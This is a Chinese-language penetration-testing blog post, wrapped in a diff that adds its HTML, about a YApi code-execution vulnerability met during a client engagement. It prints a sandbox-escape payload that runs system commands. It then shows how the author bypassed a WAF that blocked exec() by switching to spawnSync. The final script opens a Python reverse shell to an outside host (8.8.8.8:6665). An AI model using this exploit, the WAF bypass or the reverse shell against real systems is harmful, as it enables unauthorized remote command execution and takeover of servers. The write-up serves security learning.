@@ -1,0 +1,37 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h6 data-content="1" id="362c4511b9450113ab4d87a1d8b15845">本文记录了2021年一次有趣的客户目标测试实战。这次经历颇为特别，因此我将其整理成笔记，并在此分享，希望对大家有所帮助。</h6>
+<h2 data-content="1" id="f50db853aa19fd25ec85c688a0f21860">事件起因</h2>
+<p>疫情在家办公，准备开始划水的一天，这时接到 boss 的电话说要做项目，老板发话说干就干。先对先对客户资产进行收集，结果意外发现一个大宝贝！就这样开始了与 Yapi 的美丽邂逅。</p>
+<h2 data-content="1" id="09293afe208e26720c10745c81c0cf89">初步复现</h2>
+<p>目标界面是这样的<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240531025148-ab9a0900-1eb5-1.png"/><br/>
+  该应用之前爆出过代码执行漏洞，在版本&lt;=1.19.2中大致的利用过程是注册用户-&gt;创建项目-&gt;添加接口-&gt;输入代码命令-&gt;访问接口便可以查看命令执行结果,其中网上流传的payload如下所示</p>
+<pre><code>const sandbox = this
+const ObjectConstructor = this.constructor
+const FunctionConstructor = ObjectConstructor.constructor
+const myfun = FunctionConstructor('return process')
+const process = myfun()
+mockJson = process.mainModule.require("child_process").execSync("whoami")</code></pre>
+<p>当时，按照复线文章一步一步操作，直到保存脚本时却遇到了问题。正常情况下，点击保存后应该跳转到另一个页面，但这个目标没有任何反应。起初我以为是管理员禁用了保存功能，后来随便保存了一串无害字符，结果显示保存成功。<br/>
+ 查看了浏览器的网络请求状态，发现原来是保存恶意脚本的请求被拒绝了。难怪没发现该目标没有被漏洞利用过的痕迹，原来是有 WAF（Web 应用防火墙）进行防御的。</p>
+<h2 data-content="1" id="d65ce55b810b65afe82808d2ed263dfd">尝试绕过</h2>
+<p>既然碰到了就不能放过。我尝试将恶意脚本进行二分法分段保存，经过一步步尝试，最终发现被拦截是因为识别到了 <code>exec()</code> 函数，经查询上诉该恶意脚本为 Node.js 脚本，翻一翻官方文档看到了以下内容：<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240531023256-08882fb4-1eb3-1.png"/><br/>
+既然 <code>child_process.execSync()</code> 被禁，那尝试使用 <code>spawn()</code> 替代尝试是否可绕过。对照官方文档进行函数名替换后点击保存显示保存成功。这预示着成功了一大步可以初步绕过waf的检测，之后赶紧访问保存的恶意脚本进行反弹 shell 结果 vps 半天没消息，就在怀疑该主机是否不出网的时候被叫吃中午饭了，暂放一阶段。</p>
+<h2 data-content="1" id="34183ff11ebb1beb26f3143554be12ef">成功复现</h2>
+<p>吃完饭回来理了理思路，突然发现文档中 <code>exec()</code> 与 <code>spawn()</code> 语法是有区别的。<code>exec()</code> 可以直接将命令和参数写进去，比如 <code>exec(ping 8.8.8.8 -c 4)</code>，而 <code>spawn()</code> 只能 <code>spawn(ping ['8.8.8.8', '-c', '4'])</code>，<code>spawn()</code> 的命令和参数是分开的，参考官方文档的参数格式要求再一次修改命令执行脚本，使用nc反弹结果等了个寂寞，后面改成了python反弹命令，保存后访问接口，结果啪的一下很突然，成功收到了反弹连接<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240531023432-41dde038-1eb3-1.png"/></p>
+<p>最后修改后的脚本如下：</p>
+<pre><code>const sandbox = this
+const ObjectConstructor = this.constructor
+const FunctionConstructor = ObjectConstructor.constructor
+const myfun = FunctionConstructor('return process')
+const process = myfun()
+Poc = process.mainModule.require("child_process").spawnSync(
+  'python', ['-c', 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("8.8.8.8",6665));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);']
+)</code></pre>
+<h2 data-content="1" id="071c28213bfc19236aba6490c479d6d0">参考博客</h2>
+<p><a href="https://blog.csdn.net/weixin_46944519/article/details/128625474" target="_blank">https://blog.csdn.net/weixin_46944519/article/details/128625474</a></p>
+</div>
+</div>
